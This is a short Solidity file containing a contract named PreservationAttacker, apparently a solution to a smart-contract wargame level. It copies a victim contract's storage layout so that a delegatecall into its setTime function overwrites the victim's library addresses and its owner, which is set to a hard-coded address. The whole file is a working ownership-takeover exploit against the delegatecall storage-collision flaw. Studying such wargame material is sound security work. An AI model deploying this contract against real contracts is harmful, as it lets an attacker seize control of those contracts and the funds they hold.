// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint public storedTime;

    function setTime(uint _time) public {
        timeZone1Library = address(this);
        timeZone2Library = address(this);
        owner = 0x4E6172e68f81212f19f18E1958a37282350d56f4;
        storedTime = _time;
    }
}
